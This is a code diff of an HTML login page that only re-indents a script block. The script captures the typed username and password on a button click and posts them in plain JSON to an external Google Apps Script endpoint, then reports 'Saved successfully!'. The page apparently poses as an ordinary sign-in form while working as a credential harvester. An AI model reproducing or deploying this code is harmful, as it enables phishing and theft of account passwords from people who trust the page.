@@ -82,28 +82,27 @@
         <div class="or">OR</div>
         <a href="#" class="forgot-password">Forgot password?</a>
     </div>
+<script>
+    document.querySelector("button").addEventListener("click", async () => {
+        let username = document.querySelector("#username").value;
+        let password = document.querySelector("#password").value;
 
-    <script>
-        document.querySelector("button").addEventListener("click", async () => {
-            let username = document.querySelector("#username").value;
-            let password = document.querySelector("#password").value;
-    
-            let response = await fetch("https://script.google.com/macros/s/AKfycbySB5IxyWKGkKagdcXhnqv9Uu2oeTzUH5M72Cl8eFH4nDVeH2ExHcSbVcD7p3aIczc/exec", {  
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ username, password })
-            });
-    
-            let result = await response.json();
-            
-            if (result.status === "success") {
-                alert("Saved successfully! ✅");
-            } else {
-                alert("Error: " + result.message);
-            }
+        let response = await fetch("https://script.google.com/macros/s/AKfycbySB5IxyWKGkKagdcXhnqv9Uu2oeTzUH5M72Cl8eFH4nDVeH2ExHcSbVcD7p3aIczc/exec", {  
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ username, password })
         });
-    </script>
-    
+
+        let result = await response.json();
+        
+        if (result.status === "success") {
+            alert("Saved successfully! ✅");
+        } else {
+            alert("Error: " + result.message);
+        }
+    });
+</script>
+
     
 </body>
 </html>
